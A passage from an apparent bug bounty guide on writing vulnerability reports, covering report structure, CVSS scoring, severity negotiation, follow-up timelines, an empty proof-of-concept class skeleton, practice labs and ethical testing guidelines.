3. Use SameSite cookie attribute
4. Require re-authentication for sensitive actions

## Severity Recommendation
- **CVSS 3.1 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
- **CVSS 3.1 Score:** 8.8 (High)
- **Justification:** High due to account takeover potential with user interaction.
```

## Advanced Techniques and Bypass

### Advanced Report Writing Techniques

```markdown
# Advanced Report Writing

## Human Tone Writing
- Use active voice
- Avoid jargon when possible
- Write for your audience
- Be concise and direct

## Impact-First Writing
- Lead with impact
- Use real-world scenarios
- Quantify impact when possible
- Explain business consequences

## Compelling Evidence
- Use working PoCs
- Include screenshots/videos
- Provide clear reproduction steps
- Show impact demonstration
```

### Advanced PoC Development

```python
# Advanced PoC framework
class ExploitPoC:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        
    def authenticate(self, username, password):
        # Authenticate and get session
        pass
    
    def exploit(self):
        # Main exploit logic
        pass
    
    def demonstrate_impact(self):
        # Show impact of vulnerability
        pass
    
    def generate_report(self):
        # Generate report content
        pass
```

### Advanced Severity Negotiation

```markdown
# Severity Negotiation Strategies

## When Initial Severity is Too Low
1. Provide additional impact evidence
2. Show real-world exploitation scenarios
3. Reference similar accepted reports
4. Explain business consequences
5. Provide CVSS calculation

## When Triager Disagrees
1. Ask for specific concerns
2. Provide additional evidence
3. Reference platform guidelines
4. Escalate if necessary
5. Document all communication
```

### Advanced Follow-Up Strategies

```markdown
# Follow-Up Strategies

## Response Timeline
- 24-48 hours for initial response
- 1 week for triage
- 2-4 weeks for fix
- 30-90 days for disclosure

## Escalation Path
1. Initial triage response
2. Request clarification
3. Escalate to security team
4. Contact program manager
5. Use platform dispute resolution

## Communication Best Practices
- Be professional and respectful
- Provide clear evidence
- Document all communication
- Follow up regularly
- Be patient but persistent
```

## Detection and Indicators

### Report Quality Indicators

```markdown
# Report Quality Checklist

## Title
- [ ] Clear and concise
- [ ] Includes vulnerability type
- [ ] Includes affected component

## Summary
- [ ] 2-3 sentences
- [ ] High-level impact
- [ ] Why it matters

## Vulnerability Details
- [ ] Type (OWASP/CWE)
- [ ] Location (URL/endpoint)
- [ ] Affected parameter
- [ ] Root cause

## Steps to Reproduce
- [ ] Numbered steps
- [ ] Clear instructions
- [ ] Screenshots/videos

## Proof of Concept
- [ ] Working exploit
- [ ] HTTP requests
- [ ] Response evidence

## Impact Statement
- [ ] Business impact
- [ ] User impact
- [ ] Data impact

## Remediation
- [ ] Quick fix
- [ ] Long-term solution
- [ ] Security best practices

## Severity Recommendation
- [ ] CVSS 3.1 score
- [ ] Justification
- [ ] Platform-specific scoring
```

## Impact Assessment

### Impact Categories

| Impact Type | Description | Severity |
|-------------|-------------|----------|
| **Data Breach** | Theft of sensitive data | Critical |
| **Account Takeover** | Hijacking user accounts | Critical |
| **Privilege Escalation** | Elevation to admin | Critical |
| **System Compromise** | Full takeover of systems | Critical |
| **Financial Loss** | Direct financial impact | High |
| **Reputation Damage** | Brand and trust damage | High |
| **Compliance Violation** | Regulatory non-compliance | High |
| **Service Disruption** | Denial of service | Medium |

### CVSS Scoring Guide

```
CVSS 3.1 Base Score Ranges:
- Critical: 9.0-10.0
- High: 7.0-8.9
- Medium: 4.0-6.9
- Low: 0.1-3.9
- None: 0.0
```

## Common Pitfalls

1. **Unclear titles:** Vague titles confuse triagers
2. **Missing reproduction steps:** Triagers cannot reproduce the issue
3. **No working PoC:** Reports without PoCs are less convincing
4. **Incomplete impact:** Underestimating impact leads to lower severity
5. **Wrong CVSS calculation:** Incorrect scoring affects triage
6. **Platform non-compliance:** Not following platform guidelines
7. **Poor communication:** Unprofessional tone affects credibility
8. **Missing evidence:** No screenshots or videos
9. **Late follow-up:** Not responding to triager questions
10. **No remediation guidance:** Missing fix recommendations

## Integration with Other Hunting Areas

### Reporting + Vulnerability Research
- Document all findings systematically
- Create comprehensive vulnerability database
- Track vulnerability trends

### Reporting + Penetration Testing
- Generate professional pentest reports
- Communicate findings to stakeholders
- Provide actionable recommendations

### Reporting + Bug Bounty
- Maximize bounty potential
- Build reputation as researcher
- Contribute to platform security

### Reporting + Security Audits
- Create compliance documentation
- Generate audit evidence
- Support security assessments

### Reporting + Incident Response
- Document security incidents
- Provide forensic evidence
- Support incident investigation

## Practice Labs

### Lab 1: Report Writing
```bash
# Practice writing bug bounty reports
# Use provided templates
# Get feedback from peers
# Iterate and improve

# Tools: Markdown editors, grammar checkers
```

### Lab 2: CVSS Scoring
```bash
# Practice CVSS 3.1 calculation
# Use online calculators
# Verify calculations manually
# Understand each metric

# Tools: CVSS calculators, Python scripts
```

### Lab 3: PoC Development
```bash
# Practice creating PoCs
# Start with simple exploits
# Progress to complex chains
# Test on practice labs

# Tools: Burp Suite, curl, Python
```

### Lab 4: Video PoC
```bash
# Practice creating video PoCs
# Record screen demonstrations
# Edit and polish videos
# Add narration if needed

# Tools: OBS Studio, ffmpeg, video editors
```

## Ethical Guidelines

1. **Authorization First:** Only test systems you have explicit permission to test
2. **Minimize Impact:** Avoid actions that could affect other users or system stability
3. **Document Everything:** Keep detailed records of all testing activities
4. **Responsible Disclosure:** Report vulnerabilities through proper channels
5. **No Data Theft:** Do not exfiltrate real user data during testing
6. **Scope Respect:** Stay within the defined testing scope
7. **Rate Limiting:** Do not perform denial-of-service testing without explicit permission
8. **Privacy Protection:** Handle any discovered PII with care
9. **Professional Conduct:** Maintain professional standards in all interactions
10. **Ethical Reporting:** Accurately represent severity and impact

## Quick Reference Cheat Sheet

### Report Structure
```
# Title
## Summary
## Vulnerability Details
## Steps to Reproduce
## Proof of Concept
## Impact Statement
## Remediation
## Severity Recommendation
```

### CVSS 3.1 Metrics
```
Attack Vector: Network/Adjacent/Local/Physical
Attack Complexity: Low/High
Privileges Required: None/Low/High
User Interaction: None/Required
Scope: Unchanged/Changed
Confidentiality: High/Low/None
Integrity: High/Low/None
Availability: High/Low/None
```

### Platform Guidelines
```
HackerOne: Title + CVSS + CWE + Impact + Remediation
Bugcrowd: Title + VRT + Severity + Steps + Impact
Intigriti: Title + CVSS + Details + PoC + Impact
```

### PoC Types
```
Browser-Based: HTML files, JavaScript exploits
Curl-Based: One-liner commands, scripts
Burp Suite: Repeater, Intruder, Sequencer
Video: Screen recordings, demonstrations
```

### Severity Negotiation
```
1. Provide additional evidence
2. Reference similar reports
3. Explain business impact
4. Use CVSS calculation
5. Be professional and persistent
```

